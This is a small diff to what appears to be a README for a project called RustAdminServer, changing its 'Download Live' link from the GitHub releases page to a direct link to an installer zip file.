@@ -24,7 +24,7 @@
 
 <br/>
 
-[📥 Download Live](https://github.com/bolod2006/RustAdminServer/releases) •
+[📥 Download Live](https://github.com/bolod2006/RustAdminServer/releases/AdminRS.Installer.zip) •
 [🐛 Report Bug](https://github.com/bolod2006/RustAdminServer/issues) •
 [💬 Discord](https://discord.gg/k8AaJrCHZt)
 
